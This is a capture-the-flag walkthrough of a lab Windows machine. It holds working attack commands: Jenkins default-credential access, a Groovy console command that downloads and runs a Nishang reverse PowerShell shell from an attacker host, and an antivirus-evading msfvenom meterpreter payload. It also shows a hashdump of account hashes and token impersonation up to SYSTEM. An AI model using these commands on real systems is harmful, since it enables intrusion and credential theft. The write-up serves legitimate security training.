# Alfred

---

IP = `10.10.145.14`

## Initial Access

> How many ports are open? (TCP only)



```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

> What is the username and password for the login panel? (in the format username:password)

`admin:admin`

How:
random password testing


`http://10.10.145.14:8080/computer/(master)/script`

- Groovy script

println System.getenv("PATH")
println "uname -a".execute().text

- https://github.com/samratashok/nishang
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

`powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.961.75:4545/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.96.175 -Port 4545`

`println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.96.175:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.96.175 -Port 4545".execute().text`

`nc -lnvp 4545`

```
PS C:\Program Files (x86)\Jenkins> cd secrets
PS C:\Program Files (x86)\Jenkins\secrets> ls
--SNIP--
-a---        10/25/2019   9:55 PM         34 initialAdminPassword
--SNIP--

PS C:\Program Files (x86)\Jenkins\secrets> cat initialAdminPassword
44b934851a1b4275a4b23864b35eb382
PS C:\Program Files (x86)\Jenkins\secrets>

```

> What is the user.txt flag? 

`79007a09481963edf2e1321abd9ae2a0`

## Switching Shells

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.96.175 LPORT=1234 -f exe -o shell-name.exe`

This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

- After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.96.175:8000/shell-name.exe','shell-name.exe')"`

`println "powershell (New-Object System.Net.WebClient).Downloadfile('http://10.4.96.175:8000/shell-name.exe','shell-name.exe')".execute().text`

- Before running this program, ensure the handler is set up in Metasploit:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-thm-ip
set LPORT listening-port
run
```

- This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell

`Start-Process "shell-name.exe"`

This should spawn a meterpreter shell for you!

---

## Privilege Escalation

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

- User SIDs(security identifier)
- Group SIDs
- Privileges

Amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system.


Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).


```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bruce:1000:aad3b435b51404eeaad3b435b51404ee:3ea0013c7eb26d63606673c34322b4ae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

```
PS C:\Program Files (x86)\Jenkins> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

PS C:\Program Files (x86)\Jenkins>
```

- To check which tokens are available, enter the `list_tokens -g`.


```
meterpreter > list_tokens -g

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available

meterpreter >

```

We can see that the BUILTIN\Administrators token is available.

- Use the `impersonate_token "BUILTIN\Administrators"` command to impersonate the Administrators' token. 

```
meterpreter > impersonate_token "BUILTIN\Administrators"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter >
```

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the `services.exe` process. First, use the `ps` command to view processes and find the PID of the `services.exe` process. Migrate to this process using the command `migrate PID-OF-PROCESS`

```
--SNIP--
 668   580   services.exe    x64   0        NT AUTHORITY\SYSTEM      C:\Windows\System32\services.exe
--SNIP--
```

`migrate 668`

```
meterpreter > migrate 668
[*] Migrating from 2984 to 668...
[*] Migration completed successfully.
meterpreter >

```

```
meterpreter > shell
Process 564 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

```
C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a
```

> Read the root.txt file located at C:\Windows\System32\config

`dff0f748678f280250f25a45b8046b4a`